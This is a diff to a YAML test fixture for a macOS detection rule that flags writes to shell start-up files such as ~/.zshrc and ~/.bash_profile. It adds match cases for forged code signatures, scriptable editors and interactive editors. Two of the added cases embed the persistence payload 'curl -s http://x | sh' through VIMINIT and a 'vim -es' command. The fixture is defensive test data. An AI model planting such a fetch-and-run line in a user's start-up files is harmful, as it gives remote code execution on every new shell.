@@ -1,4 +1,9 @@
 match:
+  - desc: SEC-R3 vim driven through script(1) pty with VIMINIT, launched by a background payload
+    events:
+      - name: WriteFile
+        proc: {pid: 5001, ppid: 5000, exe: /usr/bin/vim, name: vim, cmdline: "vim /Users/rifqi/.zshrc", args: [vim, /Users/rifqi/.zshrc], env: {VIMINIT: ":$put='curl -s http://x | sh'|wq"}, uid: 501, euid: 501, tty: /dev/ttys013, signing_id: com.apple.vim, is_platform: true, is_signed: true}
+        file: {path: /Users/rifqi/.zshrc}
   - desc: 'sh appends a command to ~/.bash_profile with >> (ART T1546.004 #1)'
     events:
       - name: WriteFile
@@ -19,16 +24,51 @@ match:
       - name: WriteFile
         proc: {pid: 3403, ppid: 1, exe: /Users/Shared/subl, name: subl, uid: 501, euid: 501, signing_id: com.sublimetext.4, is_platform: false, is_signed: true}
         file: {path: /Users/rifqi/.bash_profile}
-nomatch:
-  - desc: benign lookalike - Apple vim edits ~/.zshrc
+  - desc: forged - VS Code's real Team ID and signing ID on a self-signed binary (cs_category local_signing)
     events:
       - name: WriteFile
-        proc: {pid: 2401, ppid: 2400, exe: /usr/bin/vim, name: vim, cmdline: "vim /Users/rifqi/.zshrc", args: [vim, /Users/rifqi/.zshrc], uid: 501, euid: 501, signing_id: com.apple.vim, is_platform: true, is_signed: true}
+        proc: {pid: 3410, ppid: 1, exe: /Applications/Visual Studio Code.app/Contents/MacOS/Electron, name: Electron, uid: 501, euid: 501, signing_id: com.microsoft.VSCode, team_id: UBF8T346G9, is_platform: false, is_signed: true, cs_category: local_signing}
         file: {path: /Users/rifqi/.zshrc}
+  - desc: VS Code's Team ID with no reported signing category fails closed
+    events:
+      - name: WriteFile
+        proc: {pid: 3411, ppid: 1, exe: /Applications/Visual Studio Code.app/Contents/MacOS/Electron, name: Electron, uid: 501, euid: 501, signing_id: com.microsoft.VSCode, team_id: UBF8T346G9, is_platform: false, is_signed: true}
+        file: {path: /Users/rifqi/.zshrc}
+  - desc: scriptable line editor - platform ed appends to ~/.zshrc from a pipe (ed is not a trusted editor)
+    events:
+      - name: WriteFile
+        proc: {pid: 3412, ppid: 2400, exe: /bin/ed, name: ed, cmdline: "ed -s /Users/rifqi/.zshrc", args: [ed, -s, /Users/rifqi/.zshrc], uid: 501, euid: 501, tty: /dev/ttys003, signing_id: com.apple.ed, is_platform: true, is_signed: true}
+        file: {path: /Users/rifqi/.zshrc}
+  - desc: scriptable vim - `vim -es` with a TTY (Ex silent mode runs commands, not an interactive edit)
+    events:
+      - name: WriteFile
+        proc: {pid: 3413, ppid: 2400, exe: /usr/bin/vim, name: vim, cmdline: "vim -es -c $put='curl -s http://x | sh' -c wq /Users/rifqi/.zshrc", args: [vim, -es, -c, "$put='curl -s http://x | sh'", -c, wq, /Users/rifqi/.zshrc], uid: 501, euid: 501, tty: /dev/ttys003, signing_id: com.apple.vim, is_platform: true, is_signed: true}
+        file: {path: /Users/rifqi/.zshrc}
+  - desc: TextEdit (no TTY, scriptable over Apple Events) is no longer trusted
+    events:
+      - name: WriteFile
+        proc: {pid: 3418, ppid: 1, exe: /System/Applications/TextEdit.app/Contents/MacOS/TextEdit, name: TextEdit, uid: 501, euid: 501, signing_id: com.apple.TextEdit, is_platform: true, is_signed: true}
+        file: {path: /Users/rifqi/.zshrc}
+  - desc: interactive Apple vim edits ~/.zshrc - alerts by design since round 3 (no terminal-editor exemption; a pty makes interactivity unprovable)
+    events:
+      - name: WriteFile
+        proc: {pid: 2401, ppid: 2400, exe: /usr/bin/vim, name: vim, cmdline: "vim /Users/rifqi/.zshrc", args: [vim, /Users/rifqi/.zshrc], uid: 501, euid: 501, tty: /dev/ttys003, signing_id: com.apple.vim, is_platform: true, is_signed: true}
+        file: {path: /Users/rifqi/.zshrc}
+  - desc: interactive `vim +42` with a TTY - alerts by design since round 3
+    events:
+      - name: WriteFile
+        proc: {pid: 2402, ppid: 2400, exe: /usr/bin/vim, name: vim, cmdline: "vim +42 /Users/rifqi/.zprofile", args: [vim, +42, /Users/rifqi/.zprofile], uid: 501, euid: 501, tty: /dev/ttys003, signing_id: com.apple.vim, is_platform: true, is_signed: true}
+        file: {path: /Users/rifqi/.zprofile}
+  - desc: interactive nano in Terminal edits ~/.bash_profile - alerts by design since round 3
+    events:
+      - name: WriteFile
+        proc: {pid: 2403, ppid: 2400, exe: /usr/bin/nano, name: nano, cmdline: "nano /Users/rifqi/.bash_profile", args: [nano, /Users/rifqi/.bash_profile], uid: 501, euid: 501, tty: /dev/ttys003, signing_id: com.apple.nano, is_platform: true, is_signed: true}
+        file: {path: /Users/rifqi/.bash_profile}
+nomatch:
   - desc: benign lookalike - VS Code (Developer ID UBF8T346G9) saves ~/.zprofile
     events:
       - name: RenameFile
-        proc: {pid: 2501, ppid: 1, exe: /Applications/Visual Studio Code.app/Contents/MacOS/Electron, name: Electron, uid: 501, euid: 501, signing_id: com.microsoft.VSCode, team_id: UBF8T346G9, is_platform: false, is_signed: true}
+        proc: {pid: 2501, ppid: 1, exe: /Applications/Visual Studio Code.app/Contents/MacOS/Electron, name: Electron, uid: 501, euid: 501, signing_id: com.microsoft.VSCode, team_id: UBF8T346G9, cs_category: developer_id, is_platform: false, is_signed: true}
         file: {path: /Users/rifqi/.zprofile.tmp-1234, dest: /Users/rifqi/.zprofile}
   - desc: zsh writes its history file, not a start-up file
     events:
